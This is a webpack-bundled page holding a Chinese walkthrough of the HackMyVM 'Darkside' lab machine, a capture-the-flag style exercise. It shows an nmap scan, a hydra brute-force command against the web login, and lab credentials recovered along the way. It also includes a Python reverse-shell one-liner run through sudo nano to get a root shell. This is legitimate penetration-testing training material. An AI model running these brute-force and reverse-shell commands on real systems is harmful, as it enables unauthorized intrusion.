"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[7713],{32040:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>l,default:()=>h,frontMatter:()=>t,metadata:()=>a,toc:()=>o});const a=JSON.parse('{"id":"HackMyVM/Machines/Darkside/index","title":"Darkside","description":"[Linux VM] [Tested on VirtualBox] created by || boyras200","source":"@site/docs/HackMyVM/Machines/Darkside/index.md","sourceDirName":"HackMyVM/Machines/Darkside","slug":"/HackMyVM/Machines/Darkside/","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Darkside/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Darkside/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackMyVM_Sidebar","previous":{"title":"Connection","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Connection/"},"next":{"title":"Driftingblues3","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Driftingblues3/"}}');var r=s(74848),i=s(28453);const t={},l="Darkside",c={},o=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"web \u670d\u52a1",id:"web-\u670d\u52a1",level:2},{value:"User - kevin",id:"user---kevin",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u63d0\u6743\u63a2\u6d4b",id:"\u63d0\u6743\u63a2\u6d4b",level:3},{value:"\u8bfb\u53d6\u547d\u4ee4\u884c\u5386\u53f2",id:"\u8bfb\u53d6\u547d\u4ee4\u884c\u5386\u53f2",level:3},{value:"User - rijaba",id:"user---rijaba",level:2},{value:"\u63d0\u6743\u63a2\u6d4b",id:"\u63d0\u6743\u63a2\u6d4b-1",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag - root",id:"flag---root",level:3}];function d(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",img:"img",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"darkside",children:"Darkside"})}),"\n",(0,r.jsxs)(n.admonition,{type:"note",children:[(0,r.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || boyras200"}),(0,r.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2023-10-30"}),(0,r.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 6d89b7cfa480c017eb8fca600469b8a7"}),(0,r.jsx)(n.p,{children:"\u2620 Root // 100"}),(0,r.jsx)(n.p,{children:"\ud83d\udc80 User // 98"}),(0,r.jsx)(n.p,{children:"\ud83d\udcddNotes //\nAre you ready to enter the darkside?"})]}),"\n",(0,r.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,r.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.107\n"})}),"\n",(0,r.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 192.168.56.107 (192.168.56.107)\nHost is up (0.00055s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)\n| ssh-hostkey:\n|   3072 e0:25:46:8e:b8:bb:ba:69:69:1b:a7:4d:28:34:04:dd (RSA)\n|   256 60:12:04:69:5e:c4:a1:42:2d:2b:51:8a:57:fe:a8:8a (ECDSA)\n|_  256 84:bb:60:b7:79:5d:09:9c:dd:24:23:a3:f2:65:89:3f (ED25519)\n80/tcp open  http    Apache httpd 2.4.56 ((Debian))\n|_http-title: The DarkSide\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|_      httponly flag not set\n|_http-server-header: Apache/2.4.56 (Debian)\n"})}),"\n",(0,r.jsx)(n.h2,{id:"web-\u670d\u52a1",children:"web \u670d\u52a1"}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u76ee\u5f55\u7206\u7834\uff0c\u5f97\u5230\u4ee5\u4e0b\u4fe1\u606f"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"[09:34:48] 301 -  317B  - /backup  ->  http://192.168.56.107/backup/\n[09:34:48] 200 -  937B  - /backup/\n[09:35:02] 200 -  683B  - /index.php\n[09:35:02] 200 -  683B  - /index.php/login/\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8bbf\u95ee ",(0,r.jsx)(n.code,{children:"/backup/"}),"\uff0c\u5f97\u5230"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="http://192.168.56.107/backup/vote.txt"',children:"rijaba: Yes\nxerosec: Yes\nsml: No\ncromiphi: No\ngatogamer: No\nchema: Yes\ntalleyrand: No\nd3b0o: Yes\n\nSince the result was a draw, we will let you enter the darkside, or at least temporarily, good luck kevin.\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u5176\u4e2d\uff0c\u53ef\u4ee5\u5f97\u5230\u4ee5\u4e0b\u7528\u6237\u540d"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"rijaba\nxerosec\nsml\ncromiphi\ngatogamer\nchema\ntalleyrand\nd3b0o\nkevin\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u6839\u636e\u63d0\u793a\uff0c\u9488\u5bf9 ",(0,r.jsx)(n.code,{children:"kevin"})," \u7528\u6237\u53d1\u8d77\u653b\u51fb"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $hydra -v -V -l kevin -P /usr/share/wordlists/rockyou.txt -I 192.168.56.107 http-post-form "/:user=kevin&pass=^PASS^:invalid"\n......\n[80][http-post-form] host: 192.168.56.107   login: kevin   password: iloveyou\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5f97\u5230\u4ee5\u4e0b\u51ed\u636e"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"kevin:iloveyou\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u767b\u5f55\u4e4b\u540e\uff0c\u5f97\u5230\u8fd9\u4efd\u4fe1\u606f"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"kgr6F1pR4VLAZoFnvRSX1t4GAEqbbph6yYs3ZJw1tXjxZyWCC\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,r.jsx)(n.a,{href:"https://gchq.github.io/CyberChef",children:"Cyberchef"})," \u7684 magic \u6a21\u5757\u5c1d\u8bd5\u81ea\u52a8\u89e3\u7801"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Cyberchef - magic",src:s(82414).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsx)(n.p,{children:"\u5f97\u5230"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"sfqekmgncutjhbypvxda.onion\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5c1d\u8bd5\u8bbf\u95ee\u8fd9\u4e2a Tor \u94fe\u63a5\uff0c\u53d1\u73b0\u5e76\u4e0d\u80fd\u8bbf\u95ee\uff0c\u8054\u60f3\u4e4b\u524d\u7684\u94fe\u63a5\uff0c\u5c1d\u8bd5\u8bbf\u95ee ",(0,r.jsx)(n.code,{children:"http://192.168.56.107/sfqekmgncutjhbypvxda.onion/"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-html",children:"<!DOCTYPE html>\n<html>\n<head>\n    <title>Which Side Are You On?</title>\n    <style>\n        body {\n            background-color: black;\n            color: white;\n            font-size: 24px;\n            margin: 0;\n        }\n    </style>\n</head>\n<body>\n    <div>\n        <p>Which Side Are You On?</p>\n    </div>\n\n    <script>\n        var sideCookie = document.cookie.match(/(^|)side=([^;]+)/);\n        if (sideCookie && sideCookie[2] === 'darkside') {\n            window.location.href = 'hwvhysntovtanj.password';\n        }\n    <\/script>\n\n\n</body>\n</html>\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5206\u6790\u7f51\u9875\u6e90\u7801\uff0c\u5373\u53ef\u89e3\u6790\u5176\u4e2d\u7684 Javascript \u903b\u8f91"}),"\n",(0,r.jsx)(n.p,{children:"\u6700\u540e\u53ef\u4ee5\u5f97\u5230\u8fd9\u4efd\u4fe1\u606f"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="http://192.168.56.107/sfqekmgncutjhbypvxda.onion/hwvhysntovtanj.password"',children:"kevin:ILoveCalisthenics\n"})}),"\n",(0,r.jsx)(n.h2,{id:"user---kevin",children:"User - kevin"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs kevin@192.168.56.107\n[16:42:59] Welcome to pwncat \ud83d\udc08!\nPassword: *****************\n[16:43:02] 192.168.56.107:22: normalizing shell path\n[16:43:03] 192.168.56.107:22: registered new host w/ db\n(local) pwncat$ back\n(remote) kevin@darkside:/home/kevin$ whoami\nkevin\n"})}),"\n",(0,r.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"(remote) kevin@darkside:/home/kevin$ cat user.txt\nUnbelievableHumble\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\u63d0\u6743\u63a2\u6d4b",children:"\u63d0\u6743\u63a2\u6d4b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="find / -perm -u=s -type f 2>/dev/null"',children:"/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/bin/umount\n/usr/bin/mount\n/usr/bin/chsh\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/bin/su\n/usr/bin/sudo\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Sorry, user kevin may not run sudo on darkside.\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="getcap -r / 2>/dev/null"',children:"/usr/bin/ping cap_net_raw=ep\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\u8bfb\u53d6\u547d\u4ee4\u884c\u5386\u53f2",children:"\u8bfb\u53d6\u547d\u4ee4\u884c\u5386\u53f2"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="/home/kevin/.history"',children:'ls -al\nhostname -I\necho "Congratulations on the OSCP Xerosec"\ntop\nps -faux\nsu rijaba\nILoveJabita\nls /home/rijaba\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u83b7\u5f97\u4e00\u4e2a\u51ed\u636e"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"rijaba:ILoveJabita\n"})}),"\n",(0,r.jsx)(n.h2,{id:"user---rijaba",children:"User - rijaba"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs rijaba@192.168.56.107\n[17:02:02] Welcome to pwncat \ud83d\udc08!\nPassword: ***********\n[17:02:05] 192.168.56.107:22: normalizing shell path\n[17:02:06] 192.168.56.107:22: registered new host w/ db\n(local) pwncat$ back\n(remote) rijaba@darkside:/home/rijaba$ whoami\nrijaba\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\u63d0\u6743\u63a2\u6d4b-1",children:"\u63d0\u6743\u63a2\u6d4b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for rijaba on darkside:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser rijaba may run the following commands on darkside:\n    (root) NOPASSWD: /usr/bin/nano\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u63d0\u6743"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"(remote) rijaba@darkside:/home/rijaba$ sudo /usr/bin/nano\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u7136\u540e ",(0,r.jsx)(n.code,{children:"Ctrl"})," + ",(0,r.jsx)(n.code,{children:"T"}),"\uff0c\u6267\u884c\u6307\u4ee4"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")\'\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u6210\u529f\u6536\u5230\u56de\u8fde\u7684shell"}),"\n",(0,r.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs -lp 9999\n[17:07:03] Welcome to pwncat \ud83d\udc08!\n[17:07:34] received connection from 192.168.56.107:33802\n[17:07:34] 192.168.56.107:33802: registered new host w/ db\n(local) pwncat$ back\n(remote) root@darkside:/home/rijaba# whoami\nroot\n"})}),"\n",(0,r.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"(remote) root@darkside:/root# cat root.txt \n  \u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2557\u2591\u2591\u2588\u2588\u2557\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2591\u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\n  \u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2550\u255d\u2591\u255a\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2551\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2591\n  \u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2588\u2588\u2557\u2591\u2591\u255a\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d\u2591\u2591\n  \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\u2588\u2588\u2551\u2591\u255a\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n  \u255a\u2550\u2550\u2550\u2550\u2550\u255d\u2591\u255a\u2550\u255d\u2591\u2591\u255a\u2550\u255d\u255a\u2550\u255d\u2591\u2591\u255a\u2550\u255d\u255a\u2550\u255d\u2591\u2591\u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u255d\u2591\u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u255d\u2591\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\n\nyoucametothedarkside\n"})})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},82414:(e,n,s)=>{s.d(n,{A:()=>a});const a=s.p+"assets/images/image_20240239-163904-8c6eee398fca848968f93fb4f8004d00.png"},28453:(e,n,s)=>{s.d(n,{R:()=>t,x:()=>l});var a=s(96540);const r={},i=a.createContext(r);function t(e){const n=a.useContext(i);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:t(e.components),a.createElement(i.Provider,{value:n},e.children)}}}]);